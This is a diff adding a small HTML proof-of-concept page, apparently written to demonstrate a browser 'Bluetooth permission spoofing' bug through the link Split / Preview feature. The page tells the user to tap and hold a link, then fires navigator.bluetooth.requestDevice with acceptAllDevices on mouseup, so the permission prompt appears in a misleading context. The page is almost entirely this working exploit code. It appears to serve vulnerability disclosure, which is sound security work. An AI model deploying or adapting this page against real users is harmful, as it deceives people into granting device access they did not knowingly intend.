@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Preview Page Bluetooth Permission Spoofing</title>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding-top: 80px;
+    }
+
+    a {
+        font-size: 18px;
+        text-decoration: none;
+        color: #1a73e8;
+        cursor: pointer;
+    }
+</style>
+</head>
+
+<body>
+
+<a id="link" href="#/">
+    Tap and hold the link, then select Split / Preview
+</a>
+
+<script>
+const link = document.getElementById('link');
+
+link.onmouseup = async () => {
+    try {
+        await navigator.bluetooth.requestDevice({
+            acceptAllDevices: true
+        });
+    } catch (e) {
+        // Permission denied / blocked / canceled
+    }
+};
+</script>
+
+</body>
+</html>
